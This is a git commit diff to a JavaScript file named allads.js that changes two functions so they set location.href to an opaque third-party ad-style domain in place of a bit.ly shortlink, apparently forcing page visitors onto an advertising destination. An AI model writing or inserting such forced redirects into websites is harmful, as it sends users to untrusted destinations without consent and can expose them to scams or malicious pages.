003a99bcc68546e4f04925e3763f95b8f3bc36c2
ekpesense <abantak9@gmail.com>
2025-02-15 15:58:49 +0100

    Update allads.js

--- allads.js
+++ allads.js
@@ -4,8 +4,8 @@
         fh();}
     setTimeout('hh();', 500);
     function fh(){
-        location.href="https://bit.ly/4ayYZ9t";
+        location.href="https://cijoorsairgusa.com/4/6674593";
     }
     function goon(){
-        location.href="https://bit.ly/4ayYZ9t";
+        location.href="https://cijoorsairgusa.com/4/6674593";
     }
